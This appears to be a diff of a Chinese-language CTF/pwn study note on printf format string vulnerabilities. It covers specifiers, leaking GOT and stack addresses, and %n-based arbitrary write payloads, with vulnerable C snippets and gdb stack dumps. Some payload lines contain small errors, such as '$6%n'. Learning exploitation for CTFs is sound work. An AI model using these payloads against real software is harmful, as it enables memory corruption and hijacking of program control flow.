+<li><code>n$</code>：获取格式化字符串中指定打印参数，显示第n个参数，32位为栈上后第n个地址</li>
+</ul>
+</li>
+<li>
+<p><strong>flags</strong></p>
+<ul>
+<li><code>#</code>：表示输出时需添加前缀，如十六进制中的<code>0x</code></li>
+</ul>
+</li>
+<li>
+<p><strong>field width</strong></p>
+<ul>
+<li>输出的最小宽度</li>
+</ul>
+</li>
+<li>
+<p><strong>.precision</strong></p>
+<ul>
+<li>输出的最大长度，依赖于特定的格式化类型</li>
+</ul>
+</li>
+<li>
+<p><strong>length</strong></p>
+<ul>
+<li>指出浮点型或整型参数输出长度</li>
+<li><code>hh</code>：整型，输出<code>char</code>一个字节</li>
+<li><code>h</code>：整型，输出<code>short</code>一个双字节</li>
+<li><code>l</code>：整型，输出<code>long</code>一个4字节；浮点型，输出<code>double</code>一个8字节</li>
+<li><code>ll</code>：整型，输出<code>long long</code>一个8字节</li>
+<li><code>L</code>：浮点型，输出<code>long double</code>一个16字节</li>
+<li><code>z</code>：整型，输出<code>size_t</code>一个8字节(64位)</li>
+</ul>
+</li>
+<li>
+<p><strong>type</strong></p>
+<ul>
+<li><code>d/i</code>：有符号整数，十进制</li>
+<li><code>u</code>：无符号整数</li>
+<li><code>x/X</code>：16进制无符号整数，x用小写字母，X用大写字母，指定精度则不足左侧补0</li>
+<li><code>a/A</code>：16进制double型格式输出栈中变量，当程序开了FORTIFY机制后，程序编译时所有printf函数被替换为__printf_chk函数，使用%a输出栈上方的数据</li>
+<li><code>o</code>：8进制无符号整数，指定精度则不足左侧补0</li>
+<li><code>s</code>：输出null结尾的字符串直到精度规定上限，将栈中的值以地址进行解析，输出该值（作为指针）指向的字符串内容（存于数据段），若该值不能解析为地址则程序崩溃</li>
+<li><code>c</code>：将int参数转为unsigned char型输出，单个字符</li>
+<li><code>p</code>：<code>void *</code>型，输出对应变量值，printf(&quot;%p&quot;,a)以地址格式打印a值，printf(&quot;%p&quot;,&amp;a)打印a所在地址，【地址泄露】</li>
+<li><code>n</code>：不输出字符，但把前方已经成功输出的字符个数写入对应的整型参数所指变量中；<code>%n</code>以4字节输入，【任意地址写】</li>
+</ul>
+</li>
+</ul>
+<p><strong>利用</strong></p>
+<ul>
+<li>劫持程序的控制流：<strong>关键变量、Got表[存放延迟绑定之后libc的函数，在libc中的实际的虚拟地址]、返回地址、hook函数、fini_array&hellip;</strong></li>
+<li><strong>地址泄露</strong>如PIE，libc，stack等，后在栈上构造地址，利用%n（或%hn，%hhn）实现任意地址写</li>
+<li>main函数调用了foo函数，foo函数存在格式化字符串漏洞</li>
+<li>且在IDA中可得到需要泄露的目标栈地址与ebp间距离（此处的ebp为main函数的栈底）</li>
+<li>可劫持foo函数栈帧中的ebp（该ebp指向prev ebp即main函数的ebp）</li>
+</ul>
+<p><strong>实际示例</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -4297,71 +5331,21 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">printf</span><span class="p">(</span><span class="s">&#34;%#lx %#lx %#lx %#lx %#lx&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="c1">//会依次解析后面的寄存器中的内容
-</span></span></span><span class="line"><span class="cl"><span class="c1">//0x1 0x2 0x3 0x7f17717e6f10 0x7f177180c040
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">printf</span><span class="p">(</span><span class="s">&#34;%300c%3$hn</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">string_len</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//arg1: %300c指定&#39;A&#39;参数输出宽度300
+</span></span></span><span class="line"><span class="cl"><span class="c1">//arg2: %3$hn向参数列表第3个参数string_len地址写入2字节, 将string_len改为0x012c即300
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>劫持程序的控制流：<strong>关键变量、Got表[存放延迟绑定之后libc的函数，在libc中的实际的虚拟地址]、返回地址、hook函数、fini_array&hellip;</strong></p>
-<p><strong>示例</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">string_len</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">string_len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="n">printf</span><span class="p">(</span><span class="s">&#34;%300c%3$hn</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">string_len</span><span class="p">);</span><span class="c1">//局部变量string_len的地址
-</span></span></span><span class="line"><span class="cl"><span class="c1">//%300c：指定字符参数的输出字段的宽度300
-</span></span></span><span class="line"><span class="cl"><span class="c1">//%3$hn：位置参数说明符，引用参数列表中的第三个参数 (&amp;string_len)
-</span></span></span><span class="line"><span class="cl"><span class="c1">//%hn：以short int的类型，2个字节，往第三个参数指向的内存地址写入一个值，输入给该变量
-</span></span></span><span class="line"><span class="cl"><span class="c1">//此时string_len为300    300：0000 0001 0010 1100
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">printf</span><span class="p">(</span><span class="s">&#34;I got length: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">string_len</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">string_len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="n">printf</span><span class="p">(</span><span class="s">&#34;%300c%3$hhn</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">string_len</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="c1">//%hhn：char类型，一个字节，以一个字节往其中写，截去高8个bit，300: 0010 1100 = 44 
-</span></span></span><span class="line"><span class="cl"><span class="c1">//%n：int类型，四个字节
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">printf</span><span class="p">(</span><span class="s">&#34;I got length: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">string_len</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="/img/pwn_note.zh-cn.assets/-172844664601120.assets"
-	
-	
-	
-	loading="lazy"
-	
-		alt="img"
-	
-	
-></p>
-<p><strong>32位</strong>情况下，在<strong>栈上找参数，打印出栈上父函数的内容</strong></p>
+</div><p><strong>32位</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">printf</span><span class="p">(</span><span class="s">&#34;%08x.%08x.%08x&#34;</span><span class="p">);</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">printf</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">.</span><span class="si">%08x</span><span class="s2">&#34;</span><span class="p">);</span> <span class="c1"># 直接栈上找参数，打印出栈上父函数的内容</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>gdb调试</p>
+</div><p>gdb调试结果</p>
 <p><img src="/img/pwn_note.zh-cn.assets/-172844664601121.assets"
 	
 	
@@ -4383,34 +5367,23 @@
 	
 ></p>
 <p><strong>64位</strong></p>
-<p><code>%p</code>函数输出顺序是：<code>rdi, rsi, rdx, rcx, r8, r9, 栈rsp往rbp</code>，<code>rdi</code>可能作为输入的参数，不打印</p>
-<p><strong>语法</strong></p>
-<ul>
-<li><code>$</code>：$前加一个数字k，使得指定打印的第k个参数，即栈上后的第k个地址【任意地址写】</li>
-<li><code>%c</code>：【任意地址写】</li>
-<li><code>%p</code>：输出栈中的值，一般为指向字符串的地址【地址泄露】</li>
-<li><code>%s</code>：输出字符串，即将栈中的值以地址进行解析，输出该值（作为指针）指向的字符串内容（存于数据段），若该值不能解析为地址则程序崩溃</li>
-<li><code>%n, %hn, %hhn</code>(half)：同%s是以地址解析，向对应参数地址写入%前方已经打印成功的字符<strong>的个数</strong>【任意地址写】，且分别是以4字节、2字节、1字节进行输入</li>
-<li><code>%a</code>：以double型的16进制格式输出栈中变量，当程序开了FORTIFY机制后，程序编译时所有printf函数被替换为__printf_chk函数，使用%a输出栈上方的数据</li>
-<li>%lx：unsigned long int（长整型）</li>
-<li>%x：unsigned int（整型）</li>
-<li>%#x：十六进制</li>
-<li>%#o：八进制</li>
-<li>%#d：十进制</li>
-<li>%c：输出单个字符</li>
-</ul>
+<p><code>%p</code>输出顺序是：<code>rdi, rsi, rdx, rcx, r8, r9, 栈rsp往rbp</code>，<code>rdi</code>可能作为输入的参数，不打印</p>
+<h3 id="任意地址读">任意地址读</h3>
 <p><strong>测试</strong></p>
-<p>通过该方法测试效果，不断调整%后的数来调整，同时保证整个payload是8的倍数，接着调试修改p为s和n</p>
+<p>① 不断调整%后的数，打印出addr的地址形式值，同时保证整个payload是8的倍数，接着修改 p 为 s 和 n 分别进行字符串输出或写入</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;abcdefghijk&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;%22$p&#34;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;AAAAAAAABBB%10$s&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404050</span><span class="p">)</span> <span class="c1"># 偏移10个输出0x404050地址中的值, s改为n就是写入4字节(0x0000000b)</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><strong>任意地址读</strong></p>
-<p><strong>地址泄露</strong>如PIE，libc，stack等，后在栈上构造地址，利用%n（或%hn，%hhn）实现任意地址写入任意值；</p>
+</div><p><strong>泄露got表地址</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -4418,20 +5391,16 @@
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">AAAA%p %p %p %p# 用于测试printf<span class="o">(</span>input<span class="o">)</span> 找到输入字符的偏移
-</span></span><span class="line"><span class="cl">AAAA0xab 0xcd 0xef 0x41414141 <span class="c1"># 此时偏移为4输出</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 终端上用于测试 printf(input) 找到输入字符AAAA的偏移</span>
+</span></span><span class="line"><span class="cl"><span class="n">AAAA</span><span class="o">%</span><span class="n">p</span> <span class="o">%</span><span class="n">p</span> <span class="o">%</span><span class="n">p</span> <span class="o">%</span><span class="n">p</span>
+</span></span><span class="line"><span class="cl"><span class="n">AAAA0xab</span> <span class="mh">0xcd</span> <span class="mh">0xef</span> <span class="mh">0x41414141</span> <span class="c1"># 此时偏移为4输出</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span> p32<span class="o">(</span>got_addr<span class="o">)</span> + b<span class="s2">&#34;%4</span><span class="nv">$s</span><span class="s2">&#34;</span> <span class="c1"># %4 偏移四个输出以该地址解析的值</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span> <span class="s1">&#39;AAAAAAAABBB%10$s&#39;</span> + p64<span class="o">(</span>0x404050<span class="o">)</span> 
-</span></span><span class="line"><span class="cl"><span class="c1"># 偏移10个输出0x404050地址中的值, s改为n就是写入4字节, 值为0xb</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">got_addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;%4$s&#34;</span> <span class="c1"># 利用 %4 偏移四个输出以该got_addr地址解析的值</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>如下图，若用户可以自己构造格式化字符串，可达到泄露read的got表地址</p>
+</div><p>用户可构造格式化字符串，泄露read的got表地址</p>
 <p><img src="/img/pwn_note.zh-cn.assets/-172844664601123.assets"
 	
 	
@@ -4442,7 +5411,8 @@
 	
 	
 ></p>
-<p><strong>任意地址写</strong></p>
+<h3 id="任意地址写">任意地址写</h3>
+<p><strong>32位</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -4451,19 +5421,18 @@
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span><span class="lnt">6
-</span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl"><span class="c1"># 覆盖大数字</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 任意读的同样方法获取偏移, 假设为6, p32(addr)4字节，填入12个a</span>
 </span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span> p32<span class="o">(</span>addr<span class="o">)</span> + b<span class="s1">&#39;a&#39;</span>*12 + b<span class="s1">&#39;$6%n&#39;</span> <span class="c1"># 向addr中填入数字16</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 覆盖小数字</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># aa%8 为一个4字节参数, $naa 为一个4字节参数, 所以addr为第 6+2 = 8个参数 </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># aa%8 栈上占4字节, $naa 栈上占4字节, 所以addr为第 4+4 = 8个参数 </span>
 </span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span> b<span class="s1">&#39;aa%8$naa&#39;</span> + p32<span class="o">(</span>addr<span class="o">)</span> <span class="c1"># 向addr中填入数字2</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/img/pwn_note.zh-cn.assets/-172844664601124.assets"
+</div><p>下图为向read的got表中写入8</p>
+<p><img src="/img/pwn_note.zh-cn.assets/-172844664601124.assets"
 	
 	
 	
@@ -4473,129 +5442,6 @@
 	
 	
 ></p>
-<p>漏洞点：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [esp+2Ch] [ebp-5Ch]
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x50u</span><span class="p">)</span>        <span class="c1">//将buf的地址开始的0x50字节的内存区域都设置为0
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x50u</span><span class="p">);</span> <span class="c1">// 或scanf输入buf
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>    <span class="c1">//buf可控，格式化字符串漏洞
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>32位read输入后，执行到将要执行printf时，找栈顶esp与输入的值的距离</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="mo">00</span><span class="o">:</span><span class="mo">0000</span><span class="err">│</span> <span class="n">esp</span>         <span class="mh">0xffffcfa0</span> <span class="err">—▸</span> <span class="mh">0xffffcfcc</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">AAAAAAAA</span><span class="err">\</span><span class="n">n</span><span class="err">&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="mo">01</span><span class="o">:</span><span class="mo">0004</span><span class="err">│</span>             <span class="mh">0xffffcfa4</span> <span class="err">—▸</span> <span class="mh">0xffffcfcc</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">AAAAAAAA</span><span class="err">\</span><span class="n">n</span><span class="err">&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="mo">02</span><span class="o">:</span><span class="mo">000</span><span class="mi">8</span><span class="err">│</span>             <span class="mh">0xffffcfa8</span> <span class="err">◂—</span> <span class="mh">0x50</span> <span class="cm">/* &#39;P&#39; */</span>
-</span></span><span class="line"><span class="cl"><span class="mo">03</span><span class="o">:</span><span class="mo">000</span><span class="n">c</span><span class="err">│</span>             <span class="mh">0xffffcfac</span> <span class="err">—▸</span> <span class="mh">0xf7ffd000</span> <span class="p">(</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x36f2c</span>
-</span></span><span class="line"><span class="cl"><span class="mo">04</span><span class="o">:</span><span class="mo">0010</span><span class="err">│</span>             <span class="mh">0xffffcfb0</span> <span class="err">—▸</span> <span class="mh">0xf7fc4540</span> <span class="p">(</span><span class="n">__kernel_vsyscall</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">push</span>   <span class="n">ecx</span>
-</span></span><span class="line"><span class="cl"><span class="mo">05</span><span class="o">:</span><span class="mo">0014</span><span class="err">│</span>             <span class="mh">0xffffcfb4</span> <span class="err">◂—</span> <span class="mh">0xffffffff</span>
-</span></span><span class="line"><span class="cl"><span class="mo">06</span><span class="o">:</span><span class="mo">001</span><span class="mi">8</span><span class="err">│</span>             <span class="mh">0xffffcfb8</span> <span class="err">—▸</span> <span class="mh">0x8048034</span> <span class="err">◂—</span> <span class="n">push</span>   <span class="n">es</span>
-</span></span><span class="line"><span class="cl"><span class="mo">07</span><span class="o">:</span><span class="mo">001</span><span class="n">c</span><span class="err">│</span>             <span class="mh">0xffffcfbc</span> <span class="err">—▸</span> <span class="mh">0xffffd0e4</span> <span class="err">—▸</span> <span class="mh">0xffffd293</span> <span class="err">◂—</span> <span class="mh">0x6d6f682f</span> <span class="p">(</span><span class="err">&#39;</span><span class="o">/</span><span class="n">hom</span><span class="err">&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="mi">08</span><span class="o">:</span><span class="mo">0020</span><span class="err">│</span>             <span class="mh">0xffffcfc0</span> <span class="err">—▸</span> <span class="mh">0xf7ffd608</span> <span class="p">(</span><span class="n">_rtld_global</span><span class="o">+</span><span class="mi">1512</span><span class="p">)</span> <span class="err">—▸</span> <span class="mh">0xf7fc6000</span> <span class="err">◂—</span> <span class="mh">0x464c457f</span>
-</span></span><span class="line"><span class="cl"><span class="mi">09</span><span class="o">:</span><span class="mo">0024</span><span class="err">│</span>             <span class="mh">0xffffcfc4</span> <span class="err">◂—</span> <span class="mh">0x20</span> <span class="cm">/* &#39; &#39; */</span>
-</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">a</span><span class="p">:</span><span class="mo">002</span><span class="mi">8</span><span class="err">│</span>             <span class="mh">0xffffcfc8</span> <span class="err">◂—</span> <span class="mi">9</span> <span class="cm">/* &#39;\t&#39; */</span>
-</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">b</span><span class="p">:</span><span class="mo">002</span><span class="n">c</span><span class="err">│</span> <span class="n">eax</span> <span class="n">ebx</span> <span class="n">ecx</span> <span class="mh">0xffffcfcc</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">AAAAAAAA</span><span class="err">\</span><span class="n">n</span><span class="err">&#39;</span>    <span class="c1">//对于printf是第12个参数
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">0</span><span class="nl">c</span><span class="p">:</span><span class="mo">0030</span><span class="err">│</span>             <span class="mh">0xffffcfd0</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">AAAA</span><span class="err">\</span><span class="n">n</span><span class="err">&#39;</span>        <span class="c1">//接上，但对格式化字符串$是第11个参数
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">0</span><span class="nl">d</span><span class="p">:</span><span class="mo">0034</span><span class="err">│</span>             <span class="mh">0xffffcfd4</span> <span class="err">◂—</span> <span class="mh">0xa</span> <span class="cm">/* &#39;\n&#39; */</span>
-</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">e</span><span class="p">:</span><span class="mo">003</span><span class="mi">8</span><span class="err">│</span>             <span class="mh">0xffffcfd8</span> <span class="err">◂—</span> <span class="mh">0x0</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>漏洞点：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">v10</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span>    <span class="c1">// [rsp+20h] [rbp-20h]    需要知道的地址
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">_isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%ms&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">format</span><span class="p">);</span>    <span class="c1">//读取一个字符串并动态分配内存
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span><span class="c1">//用泄露方法泄露栈上地址
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>在栈上找到flag地址，若为64位，则又要注意参数的位置</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="mo">00</span><span class="o">:</span><span class="mo">0000</span><span class="err">│</span> <span class="n">rsp</span> <span class="mh">0x7fffffffde10</span> <span class="err">◂—</span> <span class="mh">0x41fc1000</span>
-</span></span><span class="line"><span class="cl"><span class="mo">01</span><span class="o">:</span><span class="mo">000</span><span class="mi">8</span><span class="err">│</span>     <span class="mh">0x7fffffffde18</span> <span class="err">—▸</span> <span class="mh">0x602ca0</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">AAAAAAAA</span><span class="err">&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="mo">02</span><span class="o">:</span><span class="mo">0010</span><span class="err">│</span>     <span class="mh">0x7fffffffde20</span> <span class="err">—▸</span> <span class="mh">0x6022a0</span> <span class="err">◂—</span> <span class="mh">0x602</span>
-</span></span><span class="line"><span class="cl"><span class="mo">03</span><span class="o">:</span><span class="mo">001</span><span class="mi">8</span><span class="err">│</span>     <span class="mh">0x7fffffffde28</span> <span class="err">—▸</span> <span class="mh">0x7fffffffde30</span> <span class="err">◂—</span> <span class="mh">0x64786d7b67616c66</span> <span class="p">(</span><span class="err">&#39;</span><span class="n">flag</span><span class="p">{</span><span class="n">mxd</span><span class="err">&#39;</span><span class="p">)</span><span class="c1">//为$9，前有5个参数，栈上数4个
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mo">04</span><span class="o">:</span><span class="mo">0020</span><span class="err">│</span>     <span class="mh">0x7fffffffde30</span> <span class="err">◂—</span> <span class="mh">0x64786d7b67616c66</span> <span class="p">(</span><span class="err">&#39;</span><span class="n">flag</span><span class="p">{</span><span class="n">mxd</span><span class="err">&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="mo">05</span><span class="o">:</span><span class="mo">002</span><span class="mi">8</span><span class="err">│</span>     <span class="mh">0x7fffffffde38</span> <span class="err">◂—</span> <span class="mh">0x5f345f6e77705f77</span> <span class="p">(</span><span class="err">&#39;</span><span class="n">w_pwn_4_</span><span class="err">&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">RAX</span>  <span class="mh">0x0</span>
-</span></span><span class="line"><span class="cl"> <span class="n">RBX</span>  <span class="mh">0x0</span>
-</span></span><span class="line"><span class="cl"> <span class="n">RCX</span>  <span class="mh">0x7ffff7e97a37</span> <span class="p">(</span><span class="n">write</span><span class="o">+</span><span class="mi">23</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">cmp</span>    <span class="n">rax</span><span class="p">,</span> <span class="o">-</span><span class="mh">0x1000</span> <span class="cm">/* &#39;H=&#39; */</span>
-</span></span><span class="line"><span class="cl"> <span class="n">RDX</span>  <span class="mh">0x1</span>
-</span></span><span class="line"><span class="cl"> <span class="n">RDI</span>  <span class="mh">0x602ca0</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">AAAAAAAA</span><span class="err">&#39;</span>
-</span></span><span class="line"><span class="cl"> <span class="n">RSI</span>  <span class="mh">0x1</span>
-</span></span><span class="line"><span class="cl"> <span class="n">R8</span>   <span class="mh">0x7ffff7f9ea70</span> <span class="p">(</span><span class="n">_IO_stdfile_1_lock</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x0</span>
-</span></span><span class="line"><span class="cl"> <span class="n">R9</span>   <span class="mh">0x602ca0</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">AAAAAAAA</span><span class="err">&#39;</span>
-</span></span><span class="line"><span class="cl"> <span class="n">R10</span>  <span class="mh">0x7ffff7d93098</span> <span class="err">◂—</span> <span class="mh">0xf001200000e31</span>
-</span></span><span class="line"><span class="cl"> <span class="n">R11</span>  <span class="mh">0x246</span>
-</span></span><span class="line"><span class="cl"> <span class="n">R12</span>  <span class="mh">0x7fffffffdf68</span> <span class="err">—▸</span> <span class="mh">0x7fffffffe291</span> <span class="err">◂—</span> <span class="mh">0x736a2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">js</span><span class="err">&#39;</span><span class="p">)</span>
